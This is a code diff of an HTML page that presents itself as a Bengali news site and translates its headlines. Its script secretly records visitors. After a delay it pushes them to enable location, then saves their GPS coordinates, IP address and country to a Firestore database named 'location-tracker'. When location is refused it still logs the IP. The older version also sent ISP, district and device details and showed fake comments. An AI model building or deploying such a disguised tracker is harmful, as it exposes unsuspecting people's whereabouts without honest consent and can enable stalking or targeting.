@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Daily News</title>
+<title>ডেইলি নিউজ</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -42,7 +42,6 @@ border-radius:6px;
 .ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
 .footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}
 
-/* 🔥 SOFT GATE (blur style) */
 #locationGate{
 position:fixed;
 top:0;left:0;
@@ -62,12 +61,7 @@ border-radius:12px;
 width:90%;
 max-width:340px;
 text-align:center;
-box-shadow:0 10px 30px rgba(0,0,0,0.2);
-animation:fadeIn 0.4s ease;
 }
-
-.gate-box h2{margin-bottom:10px;}
-.gate-box p{font-size:14px;color:#555;}
 
 .gate-box button{
 width:100%;
@@ -76,47 +70,40 @@ background:#ff4b5c;
 color:white;
 border:none;
 border-radius:6px;
-font-size:16px;
 margin-top:10px;
 cursor:pointer;
-}
-
-@keyframes fadeIn{
-from{opacity:0; transform:scale(0.9);}
-to{opacity:1; transform:scale(1);}
 }
 </style>
 </head>
 
 <body>
 
-<!-- 🔥 SOFT LOCATION GATE -->
 <div id="locationGate">
 <div class="gate-box">
-<h2>📍 Enable Location</h2>
-<p>আপনার এলাকার খবর ও আপডেট দেখতে location চালু করুন</p>
-<button onclick="retryLocation()">Enable Location</button>
+<h2>📍 লোকেশন চালু করুন</h2>
+<p>আপনার এলাকার খবর দেখতে location চালু করুন</p>
+<button onclick="retryLocation()">চালু করুন</button>
 </div>
 </div>
 
-<header>📰 Daily News</header>
+<header>📰 ডেইলি নিউজ</header>
 
 <nav>
-<a href="#" onclick="showHome()">Home</a>
-<a href="#">World</a>
-<a href="#">Tech</a>
-<a href="#">Sports</a>
+<a href="#">হোম</a>
+<a href="#">বিশ্ব</a>
+<a href="#">টেক</a>
+<a href="#">খেলা</a>
 </nav>
 
 <div class="container">
 
 <div id="homePage">
-<div class="ad">📢 Advertisement</div>
+<div class="ad">📢 বিজ্ঞাপন</div>
 <div id="newsContainer" class="grid"></div>
 </div>
 
 <div id="articlePage">
-<button onclick="showHome()">⬅ Back</button>
+<button onclick="showHome()">⬅ ফিরে যান</button>
 
 <div class="article">
 <h2 id="title"></h2>
@@ -124,10 +111,8 @@ to{opacity:1; transform:scale(1);}
 <p id="content"></p>
 </div>
 
-<div class="ad">📢 Sponsored Content</div>
-
 <div class="comments">
-<h4>💬 Comments</h4>
+<h4>💬 মন্তব্য</h4>
 <div id="commentList"></div>
 </div>
 
@@ -135,196 +120,124 @@ to{opacity:1; transform:scale(1);}
 
 </div>
 
-<div class="footer">© 2026 Daily News</div>
+<div class="footer">© ২০২৬ ডেইলি নিউজ</div>
 
 <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-const firebaseConfig = {
-apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
-authDomain: "location-tracker-bba55.firebaseapp.com",
-projectId: "location-tracker-bba55",
-storageBucket: "location-tracker-bba55.appspot.com",
-messagingSenderId: "951484366467",
-appId: "1:951484366467:web:2e936d42b1704027f665b6"
-};
-
-const app = initializeApp(firebaseConfig);
+const app = initializeApp({
+apiKey:"AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
+authDomain:"location-tracker-bba55.firebaseapp.com",
+projectId:"location-tracker-bba55"
+});
 const db = getFirestore(app);
 
-// USER ID
+// SAVE
 function getUserId(){
-let id = localStorage.getItem("userId")
+let id=localStorage.getItem("uid")
 if(!id){
-id = Math.random().toString(36).substring(2,10)
-localStorage.setItem("userId", id)
+id=Math.random().toString(36).substring(2,10)
+localStorage.setItem("uid",id)
 }
 return id
 }
 
-// DEVICE
-function detectDevice(){
-let ua=navigator.userAgent;
-if(/mobile/i.test(ua)) return "Mobile";
-return "Desktop";
-}
-
-function detectDeviceModel(){
-let ua=navigator.userAgent;
-if(ua.includes("Android")) return "Android Phone";
-if(ua.includes("Windows")) return "Windows PC";
-if(ua.includes("Mac")) return "Mac";
-return "Unknown";
-}
-
-// LOCATION DETAILS
-async function getLocationDetails(lat, lon){
-try{
-const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
-const data = await res.json()
-let a = data.address
-
-return {
-thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
-district: a.state_district || a.county || "unknown"
-}
-}catch{
-return {thana:"unknown",district:"unknown"}
-}
-}
-
-// IP
 async function getIP(){
-let res = await fetch("https://ipinfo.io/json")
-let data = await res.json()
-
-return {
-ip:data.ip,
-org:data.org,
-country:data.country
-}
+let r=await fetch("https://ipinfo.io/json")
+return await r.json()
 }
 
-// SAVE
 async function save(data){
-let id = getUserId()
-await setDoc(doc(db,"locations",id), data)
+await setDoc(doc(db,"locations",getUserId()),data)
 }
 
-// GPS
-async function handleGPS(pos){
-let lat = pos.coords.latitude
-let lon = pos.coords.longitude
-let loc = await getLocationDetails(lat,lon)
-let ip = await getIP()
-
-save({
-latitude:lat,
-longitude:lon,
-thana:loc.thana,
-district:loc.district,
-country:ip.country,
-ip:ip.ip,
-isp:ip.org,
-device:detectDevice(),
-deviceModel:detectDeviceModel(),
-type:"GPS",
-time:new Date().toLocaleString()
-})
-}
-
-// IP fallback
-async function handleIP(){
-let ip = await getIP()
-save({
-country:ip.country,
-ip:ip.ip,
-isp:ip.org,
-device:detectDevice(),
-deviceModel:detectDeviceModel(),
-type:"IP",
-time:new Date().toLocaleString()
-})
-}
-
-// 🔥 AUTO OPTIMIZED FLOW
 function autoDetect(){
 navigator.geolocation.getCurrentPosition(
-pos=>{
-handleGPS(pos)
+async pos=>{
+let ip=await getIP()
+save({
+lat:pos.coords.latitude,
+lon:pos.coords.longitude,
+ip:ip.ip,
+country:ip.country,
+time:new Date().toLocaleString()
+})
 },
-()=>{
-handleIP()
+async ()=>{
+let ip=await getIP()
+save({ip:ip.ip,country:ip.country})
 document.getElementById("locationGate").style.display="flex"
 }
 )
 }
 
-// retry
-window.retryLocation = function(){
+window.retryLocation=function(){
 navigator.geolocation.getCurrentPosition(
 pos=>{
 document.getElementById("locationGate").style.display="none"
-handleGPS(pos)
 },
-()=>{
-alert("Location still blocked")
-}
+()=>alert("লোকেশন চালু করুন")
 )
+}
+
+// 🔥 TRANSLATE
+async function translate(text){
+try{
+let r=await fetch(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(text)}&langpair=en|bn`)
+let d=await r.json()
+return d.responseData.translatedText
+}catch{return text}
 }
 
 // NEWS
 let newsData=[]
 async function loadNews(){
-let res=await fetch("https://api.spaceflightnewsapi.net/v4/articles/")
-let data=await res.json()
-newsData=data.results
+let r=await fetch("https://api.spaceflightnewsapi.net/v4/articles/")
+let d=await r.json()
+newsData=d.results
 
-let container=document.getElementById("newsContainer")
-container.innerHTML=""
+let c=document.getElementById("newsContainer")
+c.innerHTML=""
 
-newsData.slice(0,8).forEach((n,i)=>{
+newsData.slice(0,8).forEach(async (n,i)=>{
+
+let title=await translate(n.title)
+
 let div=document.createElement("div")
 div.className="card"
-div.innerHTML=`<img src="${n.image_url}"><h4>${n.title}</h4>`
+div.innerHTML=`<img src="${n.image_url}"><h4>${title}</h4>`
 div.onclick=()=>openArticle(i)
-container.appendChild(div)
+
+c.appendChild(div)
 })
 }
 
-// article
-window.openArticle=function(i){
+// ARTICLE
+window.openArticle=async function(i){
 let n=newsData[i]
+
+let t=await translate(n.title)
+let s=await translate(n.summary)
+
 document.getElementById("homePage").style.display="none"
 document.getElementById("articlePage").style.display="block"
-document.getElementById("title").innerText=n.title
+
+document.getElementById("title").innerText=t
 document.getElementById("image").src=n.image_url
-document.getElementById("content").innerText=n.summary
-loadComments()
+document.getElementById("content").innerText=s
+
 }
 
+// BACK
 window.showHome=function(){
 document.getElementById("homePage").style.display="block"
 document.getElementById("articlePage").style.display="none"
 }
 
-// comments
-function loadComments(){
-let arr=["Great news!","Nice update!","Very informative"]
-let list=document.getElementById("commentList")
-list.innerHTML=""
-arr.forEach(c=>{
-let d=document.createElement("div")
-d.className="comment"
-d.innerText=c
-list.appendChild(d)
-})
-}
-
-// INIT (delay for better conversion)
-setTimeout(()=>{autoDetect()},2000)
+// INIT
+setTimeout(()=>autoDetect(),2000)
 loadNews()
 
 </script>
